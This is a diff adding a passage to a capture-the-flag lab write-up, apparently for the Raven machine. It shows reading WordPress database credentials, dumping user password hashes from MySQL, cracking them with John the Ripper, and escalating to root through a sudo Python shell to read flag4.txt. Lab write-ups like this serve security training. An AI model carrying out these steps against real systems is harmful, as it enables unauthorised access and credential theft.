@@ -64,4 +64,35 @@ ssh michael@192.168.1.110
 Password: michael
 cd /var/www/html/wordpress
 ~~~
+[picture]
+~~~
+nano wp-config.php  
+mysql -u root -pR@v3nSecurity  
+~~~
 
+**Flag 4 from Steven’s account:  **  
+- Tools used: MySQL, johntheripper  
+- Using the MySQL credentials from before:  
+~~~
+mysql -u root -pR@v3nSecurity
+show databases;
+use wordpress;
+show tables;
+select user_login, user_pass from wp_users;
+~~~
+[picture]
+This is where we found the hashed passwords.  
+Exit back out to Kali. From here we can use John the Ripper:  
+[picture]
+SSH into the webserver using Steven’s credentials:  
+~~~
+Ssh steven@192.168.1.110
+Password: pink84
+~~~
+Now we run a python exploit:
+~~~
+sudo /usr/bin/python -c 'import os;os.system("/bin/sh")'
+cd root
+cat flag4.txt
+~~~
+[picture]
